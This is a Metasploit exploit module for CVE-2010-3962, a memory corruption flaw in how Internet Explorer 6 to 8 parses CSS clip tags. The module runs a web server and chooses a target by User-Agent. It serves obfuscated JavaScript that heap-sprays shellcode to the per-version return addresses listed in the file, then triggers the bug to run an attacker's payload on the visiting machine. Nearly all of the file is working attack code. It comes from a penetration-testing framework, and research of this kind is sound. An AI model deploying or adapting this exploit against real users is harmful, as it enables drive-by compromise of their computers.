##
# $Id: ms10_xxx_ie_css_clip.rb 10907 2010-11-04 23:44:23Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::BrowserAutopwn
	autopwn_info({
		:ua_name    => HttpClients::IE,
		:ua_minver  => "6.0",
		:ua_maxver  => "8.0",
		:javascript => true,
		:os_name    => OperatingSystems::WINDOWS,
		:vuln_test  => nil, # no way to test without just trying it
	})

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Internet Explorer CSS Tags Memory Corruption',
			'Description'    => %q{
					Thie module exploits a memory corruption vulenrability within Microsoft's
				HTML engine (mshtml). When parsing an HTML page containing a specially
				crafted CSS tag, memory corruption occurs that can lead arbitrary code
				execution.

				It seems like Microsoft code inadvertantly increments a vtable pointer to
				point to an unaligned address within the vtable's function pointers. This
				leads to the program counter being set to the address determined by the
				address "[vtable+0x30+1]". The particular address depends on the exact
				version of the mshtml library in use.

				Since the address depends on the version of mshtml, some versions may not
				be exploitable. Specifically, those ending up with a program counter value
				within another module, in kernel space, or just not able to be reached with
				various memory spraying techniques.

				Also, since the address is not controllable, it is unlikely to be possible
				to use ROP to bypass non-executable memory protections.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'unknown',        # discovered in the wild
					'@yuange1975',    # PoC posted to twitter
					'Matteo Memelli', # exploit-db version
					'jduck'           # Metasploit module
				],
			'Version'        => '$Revision: 10907 $',
			'References'     =>
				[
					[ 'CVE', '2010-3962' ],
					#[ 'OSVDB', '' ],
					[ 'BID', '44536' ],
					[ 'URL', 'http://www.microsoft.com/technet/security/advisory/2458511.mspx' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/15421/' ],
					#[ 'MSB', 'MS11-???' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],

					#
					# In the targets below, 'Ret' means where EIP ends up (not under our control)
					#
					[ 'Internet Explorer 6',
						{
							'Ret' => 0x307dc9c5, # mshtml.dll 6.0.2900.5848 @ 0x7dc30000
						}
					],

					[ 'Internet Explorer 7',
						{
							'Ret' => 0x597e85f9, # mshtml.dll 7.0.5730.13 @ 0x7e830000
						}
					],

					[ 'Internet Explorer 8 on Windows 7',
						{
							'Ret' => 0x7a6902d7, # mshtml.dll 8.00.7600.16385 @ 0x68e40000
						}
					],
				],
			'DisclosureDate' => 'Nov 3 2010',
			'DefaultTarget'  => 0))
	end

	def auto_target(cli, request)
		mytarget = nil

		agent = request.headers['User-Agent']
		#print_status("Checking user agent: #{agent}")
		if agent =~ /MSIE 6\.0/
			mytarget = targets[1]   # IE6 on NT, 2000, XP and 2003
		elsif agent =~ /MSIE 7\.0/
			mytarget = targets[2]   # IE7 on XP and 2003
		elsif agent =~ /MSIE 8\.0/ and agent =~ /Windows NT 6\.1/
			mytarget = targets[3]   # IE8 on Windows 7
		else
			print_error("Unknown User-Agent #{agent} from #{cli.peerhost}:#{cli.peerport}")
		end

		mytarget
	end

	def on_request_uri(cli, request)

		mytarget = target
		if target.name == 'Automatic'
			mytarget = auto_target(cli, request)
			if (not mytarget)
				send_not_found(cli)
				return
			end
		end

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport} (target: #{mytarget.name})...")

		# Encode the shellcode
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(mytarget.arch))

		# Set the return\nops
		ret = Rex::Text.to_unescape(make_nops(4))

		# Construct the javascript
		js = <<-EOS
var memory = new Array();
function sprayHeap(shellcode, heapSprayAddr, heapBlockSize) {
var index;
var heapSprayAddr_hi = (heapSprayAddr >> 16).toString(16);
var heapSprayAddr_lo = (heapSprayAddr & 0xffff).toString(16);
while (heapSprayAddr_hi.length < 4) { heapSprayAddr_hi = "0" + heapSprayAddr_hi; }
while (heapSprayAddr_lo.length < 4) { heapSprayAddr_lo = "0" + heapSprayAddr_lo; }
var retSlide = unescape("#{ret}");
while (retSlide.length < heapBlockSize) { retSlide += retSlide; }
retSlide = retSlide.substring(0, heapBlockSize - shellcode.length);
var heapBlockCnt = (heapSprayAddr - heapBlockSize)/heapBlockSize;
for (index = 0; index < heapBlockCnt; index++) { memory[index] = retSlide + shellcode; }
}
var shellcode = unescape("#{shellcode}");
sprayHeap(shellcode, #{mytarget.ret}, 0x400000 - (shellcode.length + 0x38));
document.write("<table style=position:absolute;clip:rect(0)>");
EOS
      opts = {
         'Symbols' => {
            'Variables' => %w{ shellcode retSlide payLoadSize memory index
               heapSprayAddr_lo heapSprayAddr_hi heapSprayAddr heapBlockSize
               heapBlockCnt },
            'Methods'   => %w{ sprayHeap }
         }
      }
      js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)

		# Construct the final page
		html = <<-EOS
<html>
<body>
<script language='javascript'>
#{js}
</script>
</body>
</html>
EOS

		# Transmit the compressed response to the client
		send_response(cli, html, { 'Content-Type' => 'text/html' })

		# Handle the payload
		handler(cli)

	end

end

